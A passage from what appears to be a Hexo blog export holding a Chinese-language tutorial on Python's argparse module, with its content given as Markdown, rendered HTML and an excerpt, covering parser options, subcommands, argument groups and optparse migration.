              ?         提供了参数则取参数值；\n                                        无参数但声明了选项字符串则取const值；\n                                        无参数也未声明选择字符串则取default值\n                            *         所有参数存入list\n                            +         与*类似，但参数个数不能为空\n                            argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n        [, const]       # action/nargs部分要求的常值\n                            1、当action=\"store_const\"或者\"append_const\"时需要设置\n                            2、当选项为(-f/--foo),nargs='?'，同时未提供具体参数时，取用该值。\n        [, default]     # 参数默认值\n        [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n        [, choices]     # 允许的参数值（白名单）,tuple/range\n        [, required]    # 选项是否必须，设置为True表示选项必填。\n        [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n        [, metavar]     # 定义参数在Usage信息中的名称\n        [, dest]        # 解析后的属性名称\n    )\n- ### [自定义action](https://docs.python.org/3/library/argparse.html#action-classes)\n\n    class argparse.**Action**(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)\n\n## [parse_args()方法](https://docs.python.org/3/library/argparse.html#the-parse-args-method)\n    ArgumentParser.parse_args(args=None, namespace=None)\n一般情况下，我们直接使用如下命令就可以了：\n```python\n# args=None, 程序将sys.argv作为参数代入\nargs = parse.parse_args()              \n\n# 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。\nargs = parser.parse_args(['1', '2', '3', '4'])\n\n# namespace=custom_class，将属性分配到一个已经存在的对象中。\nparser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99)\n```\n\n## [其它工具](https://docs.python.org/3/library/argparse.html#other-utilities)\n\n- ### [子命令](https://docs.python.org/3/library/argparse.html#sub-commands)\n    很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。\n\n    ArgumentParser.**add_subparsers**([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> subparsers = parser.add_subparsers(dest='subparser_name')\n    >>> subparser1 = subparsers.add_parser('1')\n    >>> subparser1.add_argument('-x')\n    >>> subparser2 = subparsers.add_parser('2')\n    >>> subparser2.add_argument('y')\n    >>> parser.parse_args(['2', 'frobble'])\n    Namespace(subparser_name='2', y='frobble')\n\n    ```\n\n\n- ### [文件类型对象](https://docs.python.org/3/library/argparse.html#filetype-objects)\n    add_argument()中的FileType的参数\"工厂\"。\n\n    class argparse.**FileType**(mode='r', bufsize=-1, encoding=None, errors=None)\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--raw', type=argparse.FileType('wb', 0))\n    >>> parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))\n    >>> parser.parse_args(['--raw', 'raw.dat', 'file.txt'])\n    Namespace(out=<_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'>, raw=<_io.FileIO name='raw.dat' mode='wb'>)\n\n    ```\n\n- ### [参数分组](https://docs.python.org/3/library/argparse.html#argument-groups)\n    在Usage信息中的参数分组，如pip -h可以看到\"Commands\",\"General Options\"分组。\n\n    ArgumentParser.**add_argument_group**(title=None, description=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='testPROG', add_help=False)\n    >>> group1 = parser.add_argument_group('group1', 'group1 description')\n    >>> group1.add_argument('foo', help='foo help')\n    >>> group2 = parser.add_argument_group('group2', 'group2 description')\n    >>> group2.add_argument('--bar', help='bar help')\n    \n    >>> parser.print_help()\n    \n    usage: testPROG [--bar BAR] foo\n\n    group1:\n    group1 description\n\n    foo    foo help\n\n    group2:\n    group2 description\n\n    --bar BAR  bar help\n    ```\n\n- ### [互斥](https://docs.python.org/3/library/argparse.html#mutual-exclusion)\n    参数互斥！\n\n    ArgumentParser.**add_mutually_exclusive_group**(required=False)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='PROG')\n    >>> group = parser.add_mutually_exclusive_group(required=True)\n    >>> group.add_argument('--foo', action='store_true')\n    >>> group.add_argument('--bar', action='store_false')\n    >>> parser.parse_args([])\n    usage: PROG [-h] (--foo | --bar)\n    PROG: error: one of the arguments --foo --bar is required\n    ```\n\n- ### [解析器默认配置](https://docs.python.org/3/library/argparse.html#parser-defaults)\n    在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。\n\n    ArgumentParser.**set_defaults**(**kwargs)       # 设置默认值\n\n    ArgumentParser.**get_default**(dest)            # 获取默认值\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('foo', type=int)\n    >>> parser.set_defaults(bar=42, baz='badger')   # 不审查是否在命令行中声明，故而bar，baz可以直接添加\n    >>> parser.parse_args(['736'])\n    Namespace(bar=42, baz='badger', foo=736)\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值\n    >>> parser.set_defaults(foo='spam')\n    >>> parser.parse_args([])\n    Namespace(foo='spam')\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='badger')\n    >>> parser.get_default('foo')                   # 获取默认值\n    'badger'\n\n    ```\n\n- ### [打印帮忙](https://docs.python.org/3/library/argparse.html#printing-help)\n    用于打印帮助信息。\n\n    ArgumentParser.**print_usage**(file=None)\n\n    ArgumentParser.**print_help**(file=None)\n\n    ArgumentParser.**format_usage**()\n\n    ArgumentParser.**format_help**()\n\n- ### [部分解析](https://docs.python.org/3/library/argparse.html#partial-parsing)\n    有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。\n\n    ArgumentParser.**parse_known_args**(args=None, namespace=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', action='store_true')\n    >>> parser.add_argument('bar')\n    >>> parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])\n    (Namespace(bar='BAR', foo=True), ['--badger', 'spam'])     # ['--badger', 'spam']即为多余的参数。\n    ```\n\n- ### [自定义文件解析](https://docs.python.org/3/library/argparse.html#customizing-file-parsing)\n\n- ### [退出方法](https://docs.python.org/3/library/argparse.html#exiting-methods)\n\n- ### [optparse代码升级](https://docs.python.org/3/library/argparse.html#upgrading-optparse-code)\n    原本argparse是与optparse保持兼容的，但是！@#￥%……&*（。升级办法如下：\n1.    Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.\n2.    Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.\n3.    Replace callback actions and the callback_* keyword arguments with type or action arguments.\n4.    Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).\n5.    Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.\n6.    Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.\n7.    Replace the OptionParser constructor version argument with a call to parser.add_argument('--version', action='version', version='<the version>').","slug":"Python-argparse模块详解","published":1,"updated":"2017-06-08T13:15:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfrx000b97uv5aud6bkb","content":"<blockquote>\n<p>   argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。<br>   官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。<br>   <a href=\"https://docs.python.org/3/library/argparse.html\" target=\"_blank\" rel=\"external\">https://docs.python.org/3/library/argparse.html</a></p>\n</blockquote>\n<h2 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import argparse                     # 导入模板</div><div class=\"line\"></div><div class=\"line\">parser = argparse.ArgumentParser()  # 创建parser</div><div class=\"line\"></div><div class=\"line\">parser.add_argument()               # 添加参数</div><div class=\"line\"></div><div class=\"line\">args = parser.parse_args()          # 参数解析</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"ArgumentParser对象\"><a href=\"#ArgumentParser对象\" class=\"headerlink\" title=\"ArgumentParser对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argumentparser-objects\" target=\"_blank\" rel=\"external\">ArgumentParser对象</a></h2><pre><code>class argparse.ArgumentParser(\n    prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n    usage=None,                 # 替换默认的Usage信息\n    description=None,           # 程序简要信息说明(参数说明前)\n    epilog=None,                # 附加信息说明(参数说明后)\n    parents=[],                 # 继承父解析器(parser)\n    formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n    prefix_chars=&apos;-&apos;,           # 参数前缀符号(默认为-,如：-h/--help)\n    fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n    argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n    conflict_handler=&apos;error&apos;,   # 参数冲突处理\n    add_help=True,              # 帮助信息中默认添加&quot;-h, --help&quot;描述\n    allow_abbrev=True           # 允许参数缩写\n)\n</code></pre><h2 id=\"add-argument-方法\"><a href=\"#add-argument-方法\" class=\"headerlink\" title=\"add_argument()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-add-argument-method\" target=\"_blank\" rel=\"external\">add_argument()方法</a></h2><pre><code>ArgumentParser.add_argument(\n    name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n    [, action]      # 采取的基本操作\n                        store(默认)         存储参数值\n                        store_const        使用该字符串选项时，取用const值\n                        store_true         使用该字符串选项时，参数值置为True\n                        store_false        使用该字符串选项时，参数值置为False\n                        append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                        append_const       将多个字符串选项的const值合并到一个list\n                        count              统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3）\n                        help               parser默认会添加一个help action。(一般不用理会)\n                        version            打印版本信息\n                        也可以自定义action类\n    [, nargs]       # 该参数值要求的数量\n                        数值       指明参数个数\n                        ?         提供了参数则取参数值；\n                                    无参数但声明了选项字符串则取const值；\n                                    无参数也未声明选择字符串则取default值\n                        *         所有参数存入list\n                        +         与*类似，但参数个数不能为空\n                        argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n    [, const]       # action/nargs部分要求的常值\n                        1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置\n                        2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。\n    [, default]     # 参数默认值\n    [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n    [, choices]     # 允许的参数值（白名单）,tuple/range\n    [, required]    # 选项是否必须，设置为True表示选项必填。\n    [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n    [, metavar]     # 定义参数在Usage信息中的名称\n    [, dest]        # 解析后的属性名称\n)\n</code></pre><ul>\n<li><h3 id=\"自定义action\"><a href=\"#自定义action\" class=\"headerlink\" title=\"自定义action\"></a><a href=\"https://docs.python.org/3/library/argparse.html#action-classes\" target=\"_blank\" rel=\"external\">自定义action</a></h3><p>  class argparse.<strong>Action</strong>(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)</p>\n</li>\n</ul>\n<h2 id=\"parse-args-方法\"><a href=\"#parse-args-方法\" class=\"headerlink\" title=\"parse_args()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-parse-args-method\" target=\"_blank\" rel=\"external\">parse_args()方法</a></h2><pre><code>ArgumentParser.parse_args(args=None, namespace=None)\n</code></pre><p>一般情况下，我们直接使用如下命令就可以了：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># args=None, 程序将sys.argv作为参数代入</span></div><div class=\"line\">args = parse.parse_args()              </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。</span></div><div class=\"line\">args = parser.parse_args([<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>, <span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># namespace=custom_class，将属性分配到一个已经存在的对象中。</span></div><div class=\"line\">parser.parse_args(args=[<span class=\"string\">'--foo'</span>, <span class=\"string\">'BAR'</span>], namespace=custom_class99)</div></pre></td></tr></table></figure></p>\n<h2 id=\"其它工具\"><a href=\"#其它工具\" class=\"headerlink\" title=\"其它工具\"></a><a href=\"https://docs.python.org/3/library/argparse.html#other-utilities\" target=\"_blank\" rel=\"external\">其它工具</a></h2><ul>\n<li><h3 id=\"子命令\"><a href=\"#子命令\" class=\"headerlink\" title=\"子命令\"></a><a href=\"https://docs.python.org/3/library/argparse.html#sub-commands\" target=\"_blank\" rel=\"external\">子命令</a></h3><p>  很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。</p>\n<p>  ArgumentParser.<strong>add_subparsers</strong>([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparsers = parser.add_subparsers(dest=<span class=\"string\">'subparser_name'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1 = subparsers.add_parser(<span class=\"string\">'1'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1.add_argument(<span class=\"string\">'-x'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2 = subparsers.add_parser(<span class=\"string\">'2'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2.add_argument(<span class=\"string\">'y'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'2'</span>, <span class=\"string\">'frobble'</span>])</div><div class=\"line\">Namespace(subparser_name=<span class=\"string\">'2'</span>, y=<span class=\"string\">'frobble'</span>)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"文件类型对象\"><a href=\"#文件类型对象\" class=\"headerlink\" title=\"文件类型对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#filetype-objects\" target=\"_blank\" rel=\"external\">文件类型对象</a></h3><p>  add_argument()中的FileType的参数”工厂”。</p>\n<p>  class argparse.<strong>FileType</strong>(mode=’r’, bufsize=-1, encoding=None, errors=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--raw'</span>, type=argparse.FileType(<span class=\"string\">'wb'</span>, <span class=\"number\">0</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'out'</span>, type=argparse.FileType(<span class=\"string\">'w'</span>, encoding=<span class=\"string\">'UTF-8'</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'--raw'</span>, <span class=\"string\">'raw.dat'</span>, <span class=\"string\">'file.txt'</span>])</div><div class=\"line\">Namespace(out=&lt;_io.TextIOWrapper name=<span class=\"string\">'file.txt'</span> mode=<span class=\"string\">'w'</span> encoding=<span class=\"string\">'UTF-8'</span>&gt;, raw=&lt;_io.FileIO name=<span class=\"string\">'raw.dat'</span> mode=<span class=\"string\">'wb'</span>&gt;)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"参数分组\"><a href=\"#参数分组\" class=\"headerlink\" title=\"参数分组\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argument-groups\" target=\"_blank\" rel=\"external\">参数分组</a></h3><p>  在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。</p>\n<p>  ArgumentParser.<strong>add_argument_group</strong>(title=None, description=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'testPROG'</span>, add_help=<span class=\"keyword\">False</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1 = parser.add_argument_group(<span class=\"string\">'group1'</span>, <span class=\"string\">'group1 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1.add_argument(<span class=\"string\">'foo'</span>, help=<span class=\"string\">'foo help'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2 = parser.add_argument_group(<span class=\"string\">'group2'</span>, <span class=\"string\">'group2 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2.add_argument(<span class=\"string\">'--bar'</span>, help=<span class=\"string\">'bar help'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.print_help()</div><div class=\"line\"></div><div class=\"line\">usage: testPROG [--bar BAR] foo</div><div class=\"line\"></div><div class=\"line\">group1:</div><div class=\"line\">group1 description</div><div class=\"line\"></div><div class=\"line\">foo    foo help</div><div class=\"line\"></div><div class=\"line\">group2:</div><div class=\"line\">group2 description</div><div class=\"line\"></div><div class=\"line\">--bar BAR  bar help</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"互斥\"><a href=\"#互斥\" class=\"headerlink\" title=\"互斥\"></a><a href=\"https://docs.python.org/3/library/argparse.html#mutual-exclusion\" target=\"_blank\" rel=\"external\">互斥</a></h3><p>  参数互斥！</p>\n<p>  ArgumentParser.<strong>add_mutually_exclusive_group</strong>(required=False)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'PROG'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--bar'</span>, action=<span class=\"string\">'store_false'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">usage: PROG [-h] (--foo | --bar)</div><div class=\"line\">PROG: error: one of the arguments --foo --bar <span class=\"keyword\">is</span> required</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"解析器默认配置\"><a href=\"#解析器默认配置\" class=\"headerlink\" title=\"解析器默认配置\"></a><a href=\"https://docs.python.org/3/library/argparse.html#parser-defaults\" target=\"_blank\" rel=\"external\">解析器默认配置</a></h3><p>  在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。</p>\n<p>  ArgumentParser.<strong>set_defaults</strong>(**kwargs)       # 设置默认值</p>\n<p>  ArgumentParser.<strong>get_default</strong>(dest)            # 获取默认值</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'foo'</span>, type=int)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>)   <span class=\"comment\"># 不审查是否在命令行中声明，故而bar，baz可以直接添加</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'736'</span>])</div><div class=\"line\">Namespace(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>, foo=<span class=\"number\">736</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'bar'</span>) <span class=\"comment\"># 解析器级别默认值总是覆盖参数级别默认值</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">Namespace(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'badger'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.get_default(<span class=\"string\">'foo'</span>)                   <span class=\"comment\"># 获取默认值</span></div><div class=\"line\"><span class=\"string\">'badger'</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"打印帮忙\"><a href=\"#打印帮忙\" class=\"headerlink\" title=\"打印帮忙\"></a><a href=\"https://docs.python.org/3/library/argparse.html#printing-help\" target=\"_blank\" rel=\"external\">打印帮忙</a></h3><p>  用于打印帮助信息。</p>\n<p>  ArgumentParser.<strong>print_usage</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>print_help</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>format_usage</strong>()</p>\n<p>  ArgumentParser.<strong>format_help</strong>()</p>\n</li>\n<li><h3 id=\"部分解析\"><a href=\"#部分解析\" class=\"headerlink\" title=\"部分解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#partial-parsing\" target=\"_blank\" rel=\"external\">部分解析</a></h3><p>  有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。</p>\n<p>  ArgumentParser.<strong>parse_known_args</strong>(args=None, namespace=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'bar'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_known_args([<span class=\"string\">'--foo'</span>, <span class=\"string\">'--badger'</span>, <span class=\"string\">'BAR'</span>, <span class=\"string\">'spam'</span>])</div><div class=\"line\">(Namespace(bar=<span class=\"string\">'BAR'</span>, foo=<span class=\"keyword\">True</span>), [<span class=\"string\">'--badger'</span>, <span class=\"string\">'spam'</span>])     <span class=\"comment\"># ['--badger', 'spam']即为多余的参数。</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"自定义文件解析\"><a href=\"#自定义文件解析\" class=\"headerlink\" title=\"自定义文件解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#customizing-file-parsing\" target=\"_blank\" rel=\"external\">自定义文件解析</a></h3></li>\n<li><h3 id=\"退出方法\"><a href=\"#退出方法\" class=\"headerlink\" title=\"退出方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#exiting-methods\" target=\"_blank\" rel=\"external\">退出方法</a></h3></li>\n<li><h3 id=\"optparse代码升级\"><a href=\"#optparse代码升级\" class=\"headerlink\" title=\"optparse代码升级\"></a><a href=\"https://docs.python.org/3/library/argparse.html#upgrading-optparse-code\" target=\"_blank\" rel=\"external\">optparse代码升级</a></h3><p>  原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下：</p>\n</li>\n</ul>\n<ol>\n<li>Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.</li>\n<li>Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.</li>\n<li>Replace callback actions and the callback_* keyword arguments with type or action arguments.</li>\n<li>Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).</li>\n<li>Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.</li>\n<li>Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.</li>\n<li>Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’<the version=\"\">‘).</the></li>\n</ol>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>   argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。<br>   官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。<br>   <a href=\"https://docs.python.org/3/library/argparse.html\">https://docs.python.org/3/library/argparse.html</a></p>\n</blockquote>\n<h2 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import argparse                     # 导入模板</div><div class=\"line\"></div><div class=\"line\">parser = argparse.ArgumentParser()  # 创建parser</div><div class=\"line\"></div><div class=\"line\">parser.add_argument()               # 添加参数</div><div class=\"line\"></div><div class=\"line\">args = parser.parse_args()          # 参数解析</div></pre></td></tr></table></figure>","more":"<h2 id=\"ArgumentParser对象\"><a href=\"#ArgumentParser对象\" class=\"headerlink\" title=\"ArgumentParser对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argumentparser-objects\">ArgumentParser对象</a></h2><pre><code>class argparse.ArgumentParser(\n    prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n    usage=None,                 # 替换默认的Usage信息\n    description=None,           # 程序简要信息说明(参数说明前)\n    epilog=None,                # 附加信息说明(参数说明后)\n    parents=[],                 # 继承父解析器(parser)\n    formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n    prefix_chars=&apos;-&apos;,           # 参数前缀符号(默认为-,如：-h/--help)\n    fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n    argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n    conflict_handler=&apos;error&apos;,   # 参数冲突处理\n    add_help=True,              # 帮助信息中默认添加&quot;-h, --help&quot;描述\n    allow_abbrev=True           # 允许参数缩写\n)\n</code></pre><h2 id=\"add-argument-方法\"><a href=\"#add-argument-方法\" class=\"headerlink\" title=\"add_argument()方法\"></a><a 